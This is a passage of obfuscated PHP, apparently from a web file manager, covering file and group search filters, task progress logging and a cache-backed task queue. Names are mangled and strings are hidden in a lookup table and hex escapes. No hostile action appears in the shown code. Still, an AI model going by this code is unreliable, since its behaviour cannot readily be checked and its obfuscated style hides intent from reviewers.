(empty($°é¯®†¼[$ÎÆâô…Å[1980]]) || !in_array($ÎÆâô…Å[2299], $°é¯®†¼[$ÎÆâô…Å[1980]])) { return; } if (!$°é¯®†¼[$ÎÆâô…Å[2119]] || $…Ê¯Éóú[$ÎÆâô…Å[451]][$ÎÆâô…Å[437]] > 1 || !$°é¯®†¼[$ÎÆâô…Å[201]]) { return; } $Øİ‰‘…¡ = $this->sourceInfo($°é¯®†¼[$ÎÆâô…Å[201]]); if (!$Øİ‰‘…¡ || $Øİ‰‘…¡[$ÎÆâô…Å[199]] != SourceModel::TYPE_GROUP) { return; } $Ò†ä÷ÖØ = $Øİ‰‘…¡[$ÎÆâô…Å[589]]; $›ÅôÒô¥ = Model($ÎÆâô…Å[2301])->get($Ò†ä÷ÖØ); $„Ìû°– = array(); $½ä±œ¯Ò = $°é¯®†¼[$ÎÆâô…Å[2119]]; foreach ($›ÅôÒô¥[$ÎÆâô…Å[454]] as $–ùŒŒ¡°) { $±ê˜”ş† = $–ùŒŒ¡°[$ÎÆâô…Å[42]]; $ËùÙ‘á = str_replace($ÎÆâô…Å[63], $ÎÆâô…Å[22], Pinyin::get($±ê˜”ş†)); if (stripos($±ê˜”ş†, $½ä±œ¯Ò) !== !1 || stripos($ËùÙ‘á, $½ä±œ¯Ò) !== !1) { $„Ìû°–[] = $–ùŒŒ¡°[$ÎÆâô…Å[491]]; } } if (!$„Ìû°–) { return; } $ßçóÉ¡ = array($ÎÆâô…Å[519] => array($ÎÆâô…Å[17], $„Ìû°–), $ÎÆâô…Å[1820] => 0, $ÎÆâô…Å[43] => $ÎÆâô…Å[1425] . $Ò†ä÷ÖØ); $€ê¸ÃÀ¨ = Model($ÎÆâô…Å[521])->field($ÎÆâô…Å[97])->where($ßçóÉ¡)->select(); $€ê¸ÃÀ¨ = array_to_keyvalue($€ê¸ÃÀ¨, $ÎÆâô…Å[22], $ÎÆâô…Å[97]); $üêîë„ = array_unique($€ê¸ÃÀ¨); $this->_listSearchMerge($…Ê¯Éóú, $°é¯®†¼, $å…å¯Öó, $üêîë„); } private function _listSearchMerge(&$ºŞÄñ¿Ø, $”ªãáã×, $Áœ¦ŞÓõ, $Õ¯Ô›Ç¶) { $Û¦ÄŸì¤ =& $_SERVER[‰‰Ş‚€]; if (!$Õ¯Ô›Ç¶) { return; } $›İ©¤  = array_to_keyvalue($ºŞÄñ¿Ø[$Û¦ÄŸì¤[454]], $Û¦ÄŸì¤[22], $Û¦ÄŸì¤[202]); $õê˜È€ø = array_diff($Õ¯Ô›Ç¶, $›İ©¤ ); if (!$õê˜È€ø) { return; } $ÆÁ‹øîã = array($Û¦ÄŸì¤[202] => array($Û¦ÄŸì¤[17], $õê˜È€ø)); $²îïØ²ú = $this->field($Áœ¦ŞÓõ)->where($ÆÁ‹øîã)->select(); if (!$²îïØ²ú) { return; } $ÒşñÅåÃ = array(); foreach ($²îïØ²ú as $ˆÄ¾ÌÊ) { if ($this->_listSearchFilter($ˆÄ¾ÌÊ, $”ªãáã×)) { $ÒşñÅåÃ[] = $ˆÄ¾ÌÊ; } } $ºŞÄñ¿Ø[$Û¦ÄŸì¤[454]] = array_merge($ÒşñÅåÃ, $ºŞÄñ¿Ø[$Û¦ÄŸì¤[454]]); $ºŞÄñ¿Ø[$Û¦ÄŸì¤[451]][$Û¦ÄŸì¤[452]] += count($ÒşñÅåÃ); } private function _listSearchFilter($²ˆ’ÚçË, $Í…™èâ) { $è¤Í¹ı =& $_SERVER[‰‰Ş‚€]; $úÒ…®Âñ = $²ˆ’ÚçË[$è¤Í¹ı[504]] == $è¤Í¹ı[101]; if (!strstr($²ˆ’ÚçË[$è¤Í¹ı[604]], $è¤Í¹ı[60] . $Í…™èâ[$è¤Í¹ı[201]] . $è¤Í¹ı[60])) { return !1; } if (isset($Í…™èâ[$è¤Í¹ı[505]]) && $Í…™èâ[$è¤Í¹ı[505]] != $è¤Í¹ı[875]) { if ($Í…™èâ[$è¤Í¹ı[505]] == $è¤Í¹ı[88] && !$úÒ…®Âñ) { return !1; } if ($Í…™èâ[$è¤Í¹ı[505]] != $è¤Í¹ı[88] && $úÒ…®Âñ) { return !1; } if (!strstr($²ˆ’ÚçË[$è¤Í¹ı[177]], $è¤Í¹ı[60] . $Í…™èâ[$è¤Í¹ı[505]] . $è¤Í¹ı[60])) { return !1; } } if (isset($Í…™èâ[$è¤Í¹ı[2302]]) && $Í…™èâ[$è¤Í¹ı[2302]] < $²ˆ’ÚçË[$è¤Í¹ı[89]]) { return !1; } if (isset($Í…™èâ[$è¤Í¹ı[2303]]) && $Í…™èâ[$è¤Í¹ı[2303]] > $²ˆ’ÚçË[$è¤Í¹ı[89]]) { return !1; } if (isset($Í…™èâ[$è¤Í¹ı[685]]) && $Í…™èâ[$è¤Í¹ı[685]] != $²ˆ’ÚçË[$è¤Í¹ı[547]]) { return !1; } return !0; } public function listSearchChildren($áÓí‡¸¨, $§ÉÌ¨´Ï = 5000) { $ˆŞñÉÏú =& $_SERVER[‰‰Ş‚€]; $ĞŞĞÁ‘ñ = array(); $Œ´ù˜ü = $this->sourceInfo($áÓí‡¸¨); $Ù…ç™ = array($ˆŞñÉÏú[604] => array($ˆŞñÉÏú[478], $Œ´ù˜ü[$ˆŞñÉÏú[604]] . $Œ´ù˜ü[$ˆŞñÉÏú[202]] . $ˆŞñÉÏú[636])); $Ë£µöû = $this->field($ˆŞñÉÏú[89])->where($Ù…ç™)->limit($§ÉÌ¨´Ï + 1)->select(); $íß¢ª»ø = is_array($Ë£µöû) ? count($Ë£µöû) : 0; if ($íß¢ª»ø > $§ÉÌ¨´Ï) { return $this->_listSearchChildrenNear($áÓí‡¸¨, $§ÉÌ¨´Ï); } $Í´ÜûŠÚ = $this->field($ˆŞñÉÏú[202])->where($Ù…ç™)->select(); $ĞŞĞÁ‘ñ = array_to_keyvalue($Í´ÜûŠÚ, $ˆŞñÉÏú[22], $ˆŞñÉÏú[202]); return $ĞŞĞÁ‘ñ; } private function _listSearchChildrenNear($Ëô¤¼, $¥±ª‚£Ş) { $©º‚¥ÊÂ =& $_SERVER[‰‰Ş‚€]; $•ª•ø±Ù = array(); $øš´”¦Í = array($©º‚¥ÊÂ[201] => $Ëô¤¼); $Ğæ€ˆ¢ = $this->field($©º‚¥ÊÂ[2304])->where($øš´”¦Í)->select(); $˜ó¯¶èÓ = array_to_keyvalue(array_filter_by_field($Ğæ€ˆ¢, $©º‚¥ÊÂ[504], $©º‚¥ÊÂ[101]), $©º‚¥ÊÂ[22], $©º‚¥ÊÂ[202]); $•ª•ø±Ù = array_merge($•ª•ø±Ù, array_to_keyvalue($Ğæ€ˆ¢, $©º‚¥ÊÂ[22], $©º‚¥ÊÂ[202])); if (!$˜ó¯¶èÓ) { return $•ª•ø±Ù; } $øš´”¦Í = array($©º‚¥ÊÂ[201] => array($©º‚¥ÊÂ[17], $˜ó¯¶èÓ)); $Ğæ€ˆ¢ = $this->field($©º‚¥ÊÂ[2304])->where($øš´”¦Í)->limit($¥±ª‚£Ş)->select(); $•ª•ø±Ù = array_merge($•ª•ø±Ù, array_to_keyvalue($Ğæ€ˆ¢, $©º‚¥ÊÂ[22], $©º‚¥ÊÂ[202])); $•ª•ø±Ù = array_slice($•ª•ø±Ù, 0, intval($¥±ª‚£Ş)); return $•ª•ø±Ù; } private function _listSearchBindPinyin($¼˜­é…Ò, &$ ¥ûì±¯, &$—„Œ•Ì) { $¢ÃïûëÓ =& $_SERVER[‰‰Ş‚€]; if (!isset($¼˜­é…Ò[$¢ÃïûëÓ[2119]]) || !$¼˜­é…Ò[$¢ÃïûëÓ[2119]]) { return; } if (!Input::check($¼˜­é…Ò[$¢ÃïûëÓ[2119]], $¢ÃïûëÓ[402]) || strlen($¼˜­é…Ò[$¢ÃïûëÓ[2119]]) < 2) { return; } $²¶½÷¡ƒ = "\114\105\106\x54\x20\x4a\x4f\111\x4e\x20{$this->tablePrefix}\151\x6f\x5f\x73\x6f\165\x72\x63\x65\137\x6d\145\164\141\x20\x6d\x65\164\x61\40\157\x6e\x20\x73\x6f\165\162\x63\x65\x2e\163\157\x75\162\x63\145\x49\x44\x20\x3d\40\155\x65\x74\x61\x2e\x73\x6f\x75\162\x63\x65\111\x44"; $ÔÇØû–‚ = array(); $—„Œ•Ì = str_replace(array($¢ÃïûëÓ[10], $¢ÃïûëÓ[63], $¢ÃïûëÓ[2305]), $¢ÃïûëÓ[22], $—„Œ•Ì); $—„Œ•Ì = $¢ÃïûëÓ[529] . str_replace($¢ÃïûëÓ[60], $¢ÃïûëÓ[530], $—„Œ•Ì); $±–†˜¼ô = $ ¥ûì±¯[$¢ÃïûëÓ[42]]; unset($ ¥ûì±¯[$¢ÃïûëÓ[42]]); foreach ($ ¥ûì±¯ as $¤Şû¡Âù => $øÉ™«–) { $ÔÇØû–‚[$¢ÃïûëÓ[529] . $¤Şû¡Âù] = $øÉ™«–; } foreach ($±–†˜¼ô as $“—“¾Šà) { $ÔÇØû–‚[] = array($¢ÃïûëÓ[534] => $“—“¾Šà, $¢ÃïûëÓ[1110] => $¢ÃïûëÓ[2123], array($¢ÃïûëÓ[2306] => $“—“¾Šà, $¢ÃïûëÓ[2307] => array($¢ÃïûëÓ[17], array($¢ÃïûëÓ[556], $¢ÃïûëÓ[555])))); } $this->join($²¶½÷¡ƒ); $ ¥ûì±¯ = $ÔÇØû–‚; } private function _parseSearchWhere($¼­Ññ™ç) { $îàˆ˜‚¼ =& $_SERVER[‰‰Ş‚€]; $Ü³¾­óØ = array(); if (isset($¼­Ññ™ç[$îàˆ˜‚¼[857]]) && $¼­Ññ™ç[$îàˆ˜‚¼[857]]) { $Ü³¾­óØ[$îàˆ˜‚¼[98]] = array($îàˆ˜‚¼[2308], $¼­Ññ™ç[$îàˆ˜‚¼[857]]); } if (isset($¼­Ññ™ç[$îàˆ˜‚¼[858]]) && $¼­Ññ™ç[$îàˆ˜‚¼[858]]) { $¶øóÁùÜ = array($îàˆ˜‚¼[2309], $¼­Ññ™ç[$îàˆ˜‚¼[858]]); if ($Ü³¾­óØ[$îàˆ˜‚¼[98]]) { $Ü³¾­óØ[$îàˆ˜‚¼[98]] = array($Ü³¾­óØ[$îàˆ˜‚¼[98]], $¶øóÁùÜ, $îàˆ˜‚¼[2310]); } else { $Ü³¾­óØ[$îàˆ˜‚¼[98]] = $¶øóÁùÜ; } } if (isset($¼­Ññ™ç[$îàˆ˜‚¼[2302]]) && $¼­Ññ™ç[$îàˆ˜‚¼[2302]] > 0) { $Ü³¾­óØ[$îàˆ˜‚¼[89]] = array($îàˆ˜‚¼[2308], $¼­Ññ™ç[$îàˆ˜‚¼[2302]]); } if (isset($¼­Ññ™ç[$îàˆ˜‚¼[2303]]) && $¼­Ññ™ç[$îàˆ˜‚¼[2303]]) { $¶øóÁùÜ = array($îàˆ˜‚¼[2309], $¼­Ññ™ç[$îàˆ˜‚¼[2303]]); if ($Ü³¾­óØ[$îàˆ˜‚¼[89]]) { $Ü³¾­óØ[$îàˆ˜‚¼[89]] = array($Ü³¾­óØ[$îàˆ˜‚¼[89]], $¶øóÁùÜ, $îàˆ˜‚¼[2310]); } else { $Ü³¾­óØ[$îàˆ˜‚¼[89]] = $¶øóÁùÜ; } } if (isset($¼­Ññ™ç[$îàˆ˜‚¼[685]]) && $¼­Ññ™ç[$îàˆ˜‚¼[685]]) { $Ü³¾­óØ[] = array($îàˆ˜‚¼[547] => $¼­Ññ™ç[$îàˆ˜‚¼[685]], $îàˆ˜‚¼[545] => $¼­Ññ™ç[$îàˆ˜‚¼[685]], $îàˆ˜‚¼[1110] => $îàˆ˜‚¼[2123]); } if (isset($¼­Ññ™ç[$îàˆ˜‚¼[505]]) && $¼­Ññ™ç[$îàˆ˜‚¼[505]]) { $ğÌÊ²ì = $¼­Ññ™ç[$îàˆ˜‚¼[505]]; if ($ğÌÊ²ì == $îàˆ˜‚¼[88]) { $Ü³¾­óØ[$îàˆ˜‚¼[504]] = 1; } else { if ($ğÌÊ²ì == $îàˆ˜‚¼[2311]) { $Ü³¾­óØ[$îàˆ˜‚¼[504]] = 0; } else { if ($ğÌÊ²ì) { $ğÌÊ²ì = is_array($ğÌÊ²ì) ? $ğÌÊ²ì : explode($îàˆ˜‚¼[60], $ğÌÊ²ì); $Ü³¾­óØ[$îàˆ˜‚¼[505]] = array($îàˆ˜‚¼[511], $ğÌÊ²ì); $Ü³¾­óØ[$îàˆ˜‚¼[504]] = 0; } } } } $this->_parseSearchParent($¼­Ññ™ç, $Ü³¾­óØ); if (isset($¼­Ññ™ç[$îàˆ˜‚¼[2119]]) && trim($¼­Ññ™ç[$îàˆ˜‚¼[2119]])) { $ªÆÉò— = trim($¼­Ññ™ç[$îàˆ˜‚¼[2119]]); $ä½¼¬Ÿ° = explode($îàˆ˜‚¼[63], $ªÆÉò—); if (strlen($ªÆÉò—) > 2 && (substr($ªÆÉò—, 0, 1) == $îàˆ˜‚¼[129] && substr($ªÆÉò—, -1) == $îàˆ˜‚¼[129]) || substr($ªÆÉò—, 0, 1) == $îàˆ˜‚¼[68] && substr($ªÆÉò—, -1) == $îàˆ˜‚¼[68]) { $ªÆÉò— = substr($ªÆÉò—, 1, -1); $ä½¼¬Ÿ° = array($ªÆÉò—); } $Ü³¾­óØ[$îàˆ˜‚¼[42]] = array(array($îàˆ˜‚¼[635], $îàˆ˜‚¼[2121] . $ªÆÉò— . $îàˆ˜‚¼[2121])); if (count($ä½¼¬Ÿ°) > 1) { $Ü³¾­óØ[$îàˆ˜‚¼[42]] = array(); foreach ($ä½¼¬Ÿ° as $Á¸´°À‹) { if (!trim($Á¸´°À‹)) { continue; } $Ü³¾­óØ[$îàˆ˜‚¼[42]][] = array($îàˆ˜‚¼[635], $îàˆ˜‚¼[2121] . trim($Á¸´°À‹) . $îàˆ˜‚¼[2121]); } } } return $Ü³¾­óØ; } private function _parseSearchParent($¸ÂÅÛ², &$è„¡Ìíå) { $Ùâ•¯ =& $_SERVER[‰‰Ş‚€]; if (!isset($¸ÂÅÛ²[$Ùâ•¯[201]]) || !$¸ÂÅÛ²[$Ùâ•¯[201]]) { return; } $Ç¢ÚîéÁ = $this->pathInfo($¸ÂÅÛ²[$Ùâ•¯[201]]); $ê›”Öİû = $Ç¢ÚîéÁ[$Ùâ•¯[201]] . $Ùâ•¯[22] === $Ùâ•¯[239]; $¬Ø±ç™š = $Ç¢ÚîéÁ[$Ùâ•¯[199]] == $Ùâ•¯[598]; if ($Ç¢ÚîéÁ[$Ùâ•¯[614]] == $Ùâ•¯[615]) { $ŒõÖç¬Ê = $this->sourceInfo($¸ÂÅÛ²[$Ùâ•¯[201]]); $Ç¢ÚîéÁ[$Ùâ•¯[604]] = $ŒõÖç¬Ê[$Ùâ•¯[604]]; } $è„¡Ìíå[$Ùâ•¯[675]] = array($Ùâ•¯[635], $Ç¢ÚîéÁ[$Ùâ•¯[604]] . $¸ÂÅÛ²[$Ùâ•¯[201]] . $Ùâ•¯[636]); $¦¸•ÄŠÖ = isset($¸ÂÅÛ²[$Ùâ•¯[1980]]) && in_array($Ùâ•¯[598], $¸ÂÅÛ²[$Ùâ•¯[1980]]); if (!$¦¸•ÄŠÖ || !$¬Ø±ç™š || !$ê›”Öİû || !$Ç¢ÚîéÁ[$Ùâ•¯[506]]) { return; } if (!AuthModel::authCheckRoot($Ç¢ÚîéÁ[$Ùâ•¯[506]][$Ùâ•¯[507]])) { return; } $”°‹Ş³Á = $Ç¢ÚîéÁ[$Ùâ•¯[589]] . $Ùâ•¯[22]; if ($”°‹Ş³Á == $Ùâ•¯[101]) { unset($è„¡Ìíå[$Ùâ•¯[675]]); $è„¡Ìíå[$Ùâ•¯[199]] = self::TYPE_GROUP; return; } $ŒÖàèä” = Model($Ùâ•¯[605])->groupChildrenAll($”°‹Ş³Á); $øÖÀÆ×ş = count($ŒÖàèä”); if ($øÖÀÆ×ş <= 1) { return; } $¯ÙúÇÏ· = array($Ùâ•¯[201] => 0, $Ùâ•¯[199] => self::TYPE_GROUP, $Ùâ•¯[589] => array($Ùâ•¯[17], $ŒÖàèä”)); $äşÒÃ’¸ = $this->field($Ùâ•¯[2312])->where($¯ÙúÇÏ·)->limit($øÖÀÆ×ş)->select(); $è„¡Ìíå[$Ùâ•¯[675]] = array(); foreach ($äşÒÃ’¸ as $¡î”âĞ) { $è„¡Ìíå[$Ùâ•¯[675]][] = array($Ùâ•¯[635], $Ùâ•¯[613] . $¡î”âĞ[$Ùâ•¯[202]] . $Ùâ•¯[636]); } $è„¡Ìíå[$Ùâ•¯[675]][] = $Ùâ•¯[2123]; } } goto cí©˜÷ˆ«Ç; c“é³¨×¦Ö: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($¤¸Í·šŸ, $‚èˆéÔ = '', $ãÓ„™ê™ = 0, $ÊÓÚÛ‡× = '') { $ÇáİŒº± =& $_SERVER[‰‰Ş‚€]; $ÊÓÚÛ‡× = $ÊÓÚÛ‡× ? $ÊÓÚÛ‡× : ($‚èˆéÔ ? $‚èˆéÔ : $¤¸Í·šŸ); $¼§£õõó = new Task($¤¸Í·šŸ, $‚èˆéÔ, $ãÓ„™ê™, $ÊÓÚÛ‡×); $GLOBALS[$ÇáİŒº±[1904] . $¤¸Í·šŸ] = new TaskLog($ÇáİŒº±[1803], $¼§£õõó, $ÊÓÚÛ‡×); return $¼§£õõó; } public function __construct($ºô©‰‹ı = '', $ƒÌ”œú = '', $ı‘Ô±Åô = '') { $´öŠ’Ã· =& $_SERVER[‰‰Ş‚€]; if (!$ºô©‰‹ı) { $ºô©‰‹ı = $´öŠ’Ã·[1803]; } $€Æ§Ç•Ì = $ºô©‰‹ı . $´öŠ’Ã·[481] . rand_string(10); if (!$ı‘Ô±Åô) { $ı‘Ô±Åô = $ºô©‰‹ı . $´öŠ’Ã·[63] . $ı‘Ô±Åô; } switch ($ºô©‰‹ı) { case $´öŠ’Ã·[1803]: if (!$ƒÌ”œú || !$ƒÌ”œú->task) { return echoLog($ºô©‰‹ı . $´öŠ’Ã·[1905]); } $ìç„º•˜ = $ƒÌ”œú; $€Æ§Ç•Ì = $ìç„º•˜->task[$´öŠ’Ã·[491]]; $ºô©‰‹ı = $ìç„º•˜->task[$´öŠ’Ã·[491]]; if (!$ìç„º•˜->task[$´öŠ’Ã·[1707]]) { $ìç„º•˜->task[$´öŠ’Ã·[1707]] = $ı‘Ô±Åô ? $ı‘Ô±Åô : $ºô©‰‹ı; } break; case $´öŠ’Ã·[1906]: if (!$ƒÌ”œú) { return echoLog($ºô©‰‹ı . $´öŠ’Ã·[1907]); } $ÎšÚÜ˜ = is_string($ƒÌ”œú) ? array($ƒÌ”œú) : $ƒÌ”œú; $ìç„º•˜ = new TaskFileTransfer($€Æ§Ç•Ì, $ºô©‰‹ı, 0, $ı‘Ô±Åô ? $ı‘Ô±Åô : $ÎšÚÜ˜[0]); foreach ($ÎšÚÜ˜ as $Î‰É¹òï) { $ìç„º•˜->addPath($Î‰É¹òï); } break; case $´öŠ’Ã·[397]: if (!$ƒÌ”œú) { return echoLog($ºô©‰‹ı . $´öŠ’Ã·[1907]); } $ÎšÚÜ˜ = is_string($ƒÌ”œú) ? array($ƒÌ”œú) : $ƒÌ”œú; $ìç„º•˜ = new TaskZip($€Æ§Ç•Ì, $ºô©‰‹ı, 0, $ı‘Ô±Åô ? $ı‘Ô±Åô : $ÎšÚÜ˜[0]); foreach ($ÎšÚÜ˜ as $Î‰É¹òï) { $ìç„º•˜->addPath($Î‰É¹òï); } break; case $´öŠ’Ã·[1338]: if (!$ƒÌ”œú) { return echoLog($ºô©‰‹ı . $´öŠ’Ã·[1907]); } $ìç„º•˜ = new TaskUnZip($€Æ§Ç•Ì, $ºô©‰‹ı, 0, $ı‘Ô±Åô ? $ı‘Ô±Åô : $ƒÌ”œú); if ($ƒÌ”œú) { $ìç„º•˜->addFile($ƒÌ”œú); } break; case $´öŠ’Ã·[160]: $ìç„º•˜ = new TaskHttp($€Æ§Ç•Ì, $ºô©‰‹ı); break; default: return; break; } $this->task = $ìç„º•˜; $this->taskID = $€Æ§Ç•Ì; Hook::bind($´öŠ’Ã·[1841], array($this, $´öŠ’Ã·[1908])); Hook::bind($´öŠ’Ã·[1843], array($this, $´öŠ’Ã·[1909])); Hook::bind($´öŠ’Ã·[1837], array($this, $´öŠ’Ã·[1910])); echoLog($´öŠ’Ã·[1911] . $ìç„º•˜->task[$´öŠ’Ã·[1707]]); } public function __destruct() { $this->end(); } public function end($ÏšØ¤ = '') { $¶ûİÓÀ =& $_SERVER[‰‰Ş‚€]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($ÏšØ¤); $this->task = !1; $this->taskID = !1; Hook::unbind($¶ûİÓÀ[1841], array($this, $¶ûİÓÀ[1908])); Hook::unbind($¶ûİÓÀ[1843], array($this, $¶ûİÓÀ[1909])); Hook::unbind($¶ûİÓÀ[1837], array($this, $¶ûİÓÀ[1910])); } public function taskUpdate($˜Ğ°¹î) { $Ù–ù¬  =& $_SERVER[‰‰Ş‚€]; if (!$˜Ğ°¹î || $this->taskID != $˜Ğ°¹î[$Ù–ù¬ [491]]) { return; } $ÜÄ±›Ù‰ = 20; $œ¤¯‰ã¯ = intval($˜Ğ°¹î[$Ù–ù¬ [1822]] * $ÜÄ±›Ù‰); $€É”ÎÕİ = $Ù–ù¬ [184] . str_repeat($Ù–ù¬ [472], $œ¤¯‰ã¯) . $Ù–ù¬ [1124] . str_repeat($Ù–ù¬ [63], $ÜÄ±›Ù‰ - $œ¤¯‰ã¯) . $Ù–ù¬ [186]; $ªéàôÉÜ = $€É”ÎÕİ . sprintf($Ù–ù¬ [1912], $˜Ğ°¹î[$Ù–ù¬ [1822]] * 100) . $Ù–ù¬ [1913]; $—İ¶¨ù’ = $ªéàôÉÜ . $˜Ğ°¹î[$Ù–ù¬ [1821]] . $Ù–ù¬ [18] . $˜Ğ°¹î[$Ù–ù¬ [1172]] . LNG($Ù–ù¬ [1914]); $…ƒæúÚä = $Ù–ù¬ [22]; if ($˜Ğ°¹î[$Ù–ù¬ [1898]]) { $—İ¶¨ù’ = $ªéàôÉÜ . size_format($˜Ğ°¹î[$Ù–ù¬ [1821]]) . $Ù–ù¬ [18] . size_format($˜Ğ°¹î[$Ù–ù¬ [1172]]); $…ƒæúÚä = size_format($˜Ğ°¹î[$Ù–ù¬ [1823]]) . $Ù–ù¬ [1915]; } if ($˜Ğ°¹î[$Ù–ù¬ [1174]]) { $˜Ğ°¹î[$Ù–ù¬ [1872]] = $˜Ğ°¹î[$Ù–ù¬ [1174]] . $Ù–ù¬ [63] . $˜Ğ°¹î[$Ù–ù¬ [1872]]; } if ($˜Ğ°¹î[$Ù–ù¬ [1872]]) { $ëà¬Ä¶© = $Ù–ù¬ [22]; if ($˜Ğ°¹î[$Ù–ù¬ [1874]]) { $ëà¬Ä¶© = $Ù–ù¬ [60] . size_format($˜Ğ°¹î[$Ù–ù¬ [1875]]) . $Ù–ù¬ [18] . size_format($˜Ğ°¹î[$Ù–ù¬ [1874]]); } $…ƒæúÚä .= $˜Ğ°¹î[$Ù–ù¬ [1872]] . $ëà¬Ä¶©; } if ($˜Ğ°¹î[$Ù–ù¬ [860]] && !$˜Ğ°¹î[$Ù–ù¬ [1874]]) { $…ƒæúÚä .= $Ù–ù¬ [63] . size_format($˜Ğ°¹î[$Ù–ù¬ [1879]]) . $Ù–ù¬ [18] . size_format($˜Ğ°¹î[$Ù–ù¬ [860]]); } echoLog($—İ¶¨ù’ . $Ù–ù¬ [63] . $…ƒæúÚä, !0); } public function taskEnd($ğÃØ¦Ÿô) { $¸ÂÑãİÙ =& $_SERVER[‰‰Ş‚€]; if (!$ğÃØ¦Ÿô || $this->taskID != $ğÃØ¦Ÿô[$¸ÂÑãİÙ[491]]) { return; } $¨¥æ±ª´ = $ğÃØ¦Ÿô ? LNG($¸ÂÑãİÙ[1916]) . $¸ÂÑãİÙ[14] . $ğÃØ¦Ÿô[$¸ÂÑãİÙ[1821]] . $¸ÂÑãİÙ[18] . $ğÃØ¦Ÿô[$¸ÂÑãİÙ[1172]] . LNG($¸ÂÑãİÙ[1914]) . $¸ÂÑãİÙ[84] : $¸ÂÑãİÙ[22]; echoLog($¸ÂÑãİÙ[1917] . $ğÃØ¦Ÿô[$¸ÂÑãİÙ[1707]] . ($ğÃØ¦Ÿô[$¸ÂÑãİÙ[544]] ? $¸ÂÑãİÙ[84] . $ğÃØ¦Ÿô[$¸ÂÑãİÙ[544]] : $¸ÂÑãİÙ[22]) . $¸ÂÑãİÙ[84] . $¨¥æ±ª´ . $¸ÂÑãİÙ[1918] . sprintf($¸ÂÑãİÙ[959], timeFloat() - $ğÃØ¦Ÿô[$¸ÂÑãİÙ[1824]]) . $¸ÂÑãİÙ[1836]); $this->end(); } public function taskKill($¤†“à¿) { $”Ğç¼ú =& $_SERVER[‰‰Ş‚€]; if (!$¤†“à¿ || $this->taskID != $¤†“à¿[$”Ğç¼ú[491]]) { return; } echoLog($”Ğç¼ú[1919] . $¤†“à¿[$”Ğç¼ú[1707]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\x61\163\x6b\x51\165\145\165\x65\x4c\145\156\x67\x74\150"; const QUEUE_DATA = "\164\x61\x73\x6b\x51\165\x65\165\145\x44\x61\x74\141"; const QUEUE_TIME = "\164\x61\163\153\121\x75\x65\165\145\114\141\x73\x74\x52\x75\x6e"; const QUEUE_THREAD = "\x74\x61\x73\153\121\x75\x65\x75\x65\x54\x68\x72\145\141\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($Àòæíà«, $‚õÆüò… = array(), $êûÁü¡ò = '', $©Ï–ş°Ñ = '') { $ŒøÉ…¾• =& $_SERVER[‰‰Ş‚€]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($©Ï–ş°Ñ && array_find_by_field(self::$listData, $ŒøÉ…¾•[105], $©Ï–ş°Ñ)) { return !0; } if ($©Ï–ş°Ñ && array_find_by_field(self::$listDataAdd, $ŒøÉ…¾•[105], $©Ï–ş°Ñ)) { return !0; } self::$listDataAdd[] = array($ŒøÉ…¾•[351] => $Àòæíà«, $ŒøÉ…¾•[1920] => $‚õÆüò…, $ŒøÉ…¾•[544] => $êûÁü¡ò, $ŒøÉ…¾•[105] => $©Ï–ş°Ñ); return !0; } public static function addSubmit() { $ª®««©ê =& $_SERVER[‰‰Ş‚€]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($ª®««©ê[1921] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $ª®««©ê[22], $ª®««©ê[544])), $ª®««©ê[206]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($­Øª Å, $äì Õüé = array(), $¿ÉØğ‘ = '', $Ù¬ÙßÆÆ = '') { $š·Üû²ë =& $_SERVER[‰‰Ş‚€]; if (self::count() >= self::MAX_LENGTH) { return !1; } $éÓòûÔ = self::getAll(); if ($Ù¬ÙßÆÆ && array_find_by_field($éÓòûÔ, $š·Üû²ë[105], $Ù¬ÙßÆÆ)) { return !0; } $éÓòûÔ[] = array($š·Üû²ë[351] => $­Øª Å, $š·Üû²ë[1920] => $äì Õüé, $š·Üû²ë[544] => $¿ÉØğ‘, $š·Üû²ë[105] => $Ù¬ÙßÆÆ); self::setAll($éÓòûÔ); write_log($š·Üû²ë[1921] . $¿ÉØğ‘, $š·Üû²ë[206]); return !0; } public static function run() { $üß¢‘ =& $_SERVER[‰‰Ş‚€]; $õ·øÈ¸İ = self::getAll(); $üú‰³ø = array_shift($õ·øÈ¸İ); if (!$üú‰³ø) { return !1; } self::setAll($õ·øÈ¸İ); $º¦Ïğî = timeFloat(); $Ã¥«ÎÉ· = $üß¢‘[22]; try { $Ã¥«ÎÉ· = Hook::apply($üú‰³ø[$üß¢‘[351]], $üú‰³ø[$üß¢‘[1920]]); } catch (Exception $ûÁö“†©) { write_log($ûÁö“†©, $üß¢‘[1303]); } $ì®Ãã˜³ = number_format(timeFloat() - $º¦Ïğî, 3) . $üß¢‘[1836]; if ($Ã¥«ÎÉ· && is_string($Ã¥«ÎÉ·)) { $ì®Ãã˜³ = $ì®Ãã˜³ . $üß¢‘[1922] . $Ã¥«ÎÉ·; } write_log($üß¢‘[1923] . $üú‰³ø[$üß¢‘[544]] . $üß¢‘[1924] . $ì®Ãã˜³, $üß¢‘[206]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $œ—ÑœãÅ =& $_SERVER[‰‰Ş‚€]; $õºí¼˜­ = self::threadCount() + 1; if ($õºí¼˜­ > 3 || !self::count()) { return; } write_log($œ—ÑœãÅ[1925] . $õºí¼˜­, $œ—ÑœãÅ[206]); Cache::set(self::QUEUE_THREAD, $õºí¼˜­, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($œ—ÑœãÅ[1926], $œ—ÑœãÅ[206]); } public static function getKey($œĞ—ÏˆÑ, $ù«šÃ¶ú = "\151\x6e\164") { $Ò¦ÈŒ“ =& $_SERVER[‰‰Ş‚€]; Cache::removeMemory($œĞ—ÏˆÑ); $Ç…ÙÏáÖ = Cache::get($œĞ—ÏˆÑ); if ($ù«šÃ¶ú == $Ò¦ÈŒ“[373]) { return $Ç…ÙÏáÖ ? intval($Ç…ÙÏáÖ) : 0; } if ($ù«šÃ¶ú == $Ò¦ÈŒ“[1927]) { 